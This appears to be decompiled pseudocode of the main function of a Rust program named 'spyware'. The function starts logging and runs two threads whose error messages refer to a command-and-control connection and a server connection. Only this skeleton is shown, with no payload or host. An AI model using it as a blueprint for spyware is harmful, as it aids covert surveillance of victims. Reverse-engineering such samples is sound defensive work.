__int64 spyware::main()
{
  __int64 v0; // rax
  __int64 v1; // rdx
  __int64 v2; // rsi
  __int64 v3; // rdx
  __int64 v4; // rcx
  __int64 v5; // r8
  __int64 v6; // r9
  __int64 v7; // rax
  __int64 v8; // rdx
  __int128 v10; // [rsp+0h] [rbp-D8h] BYREF
  _BYTE v11[24]; // [rsp+10h] [rbp-C8h]
  char v12; // [rsp+28h] [rbp-B0h]
  int v13; // [rsp+29h] [rbp-AFh]
  __int16 v14; // [rsp+2Dh] [rbp-ABh]
  char v15; // [rsp+2Fh] [rbp-A9h]
  __int128 v16; // [rsp+38h] [rbp-A0h] BYREF
  unsigned __int64 v17; // [rsp+48h] [rbp-90h]
  unsigned __int64 v18; // [rsp+50h] [rbp-88h]
  __int64 v19; // [rsp+58h] [rbp-80h]
  char v20; // [rsp+60h] [rbp-78h]
  int v21; // [rsp+61h] [rbp-77h]
  __int16 v22; // [rsp+65h] [rbp-73h]
  char v23; // [rsp+67h] [rbp-71h]
  _QWORD v24[5]; // [rsp+68h] [rbp-70h] BYREF
  _OWORD v25[2]; // [rsp+90h] [rbp-48h] BYREF
  _OWORD v26[2]; // [rsp+B0h] [rbp-28h] BYREF

  spyware::init_logging();
  if ( (unsigned __int64)core::sync::atomic::atomic_load() >= 3 )
  {
    *(_QWORD *)&v10 = &off_B9430;
    *((_QWORD *)&v10 + 1) = 1LL;
    *(_QWORD *)v11 = 8LL;
    *(_OWORD *)&v11[8] = 0LL;
    v24[0] = aSpyware;
    v24[1] = 7LL;
    v24[2] = aSpyware;
    v24[3] = 7LL;
    v24[4] = log::__private_api::loc(&off_B9440);
    log::__private_api::log(&v10, 3LL, v24);
  }
  v17 = 0x8000000000000000LL;
  *(_QWORD *)&v16 = 0LL;
  v20 = 0;
  *(_QWORD *)&v11[16] = v19;
  v12 = 0;
  v13 = v21;
  v14 = v22;
  v15 = v23;
  *(_OWORD *)v11 = __PAIR128__(v18, 0x8000000000000000LL);
  v10 = v16;
  ((void (__fastcall *)(_QWORD *, __int128 *))std::thread::Builder::spawn_unchecked)(v24, &v10);
  core::result::Result<T,E>::expect(v25, v24);
  std::thread::Builder::spawn_unchecked(&v10, &v16);
  core::result::Result<T,E>::expect(v26, &v10);
  *(_OWORD *)v11 = v26[1];
  v10 = v26[0];
  v0 = ((__int64 (__fastcall *)(__int128 *))std::thread::JoinInner<T>::join)(&v10);
  v2 = v1;
  core::result::Result<T,E>::expect(v0, v1, aTheCncConnecti, 32LL, &off_B9458);
  *(_OWORD *)v11 = v25[1];
  v10 = v25[0];
  v7 = ((__int64 (__fastcall *)(__int128 *, __int64, __int64, __int64, __int64, __int64))std::thread::JoinInner<T>::join)(
         &v10,
         v2,
         v3,
         v4,
         v5,
         v6);
  return core::result::Result<T,E>::expect(
           v7,
           v8,
           "The server connection has panicked.LoggingNotInitializedErrorLoggingSetupCalledTwiceLoggingInitializationError",
           35LL,
           &off_B9470);
}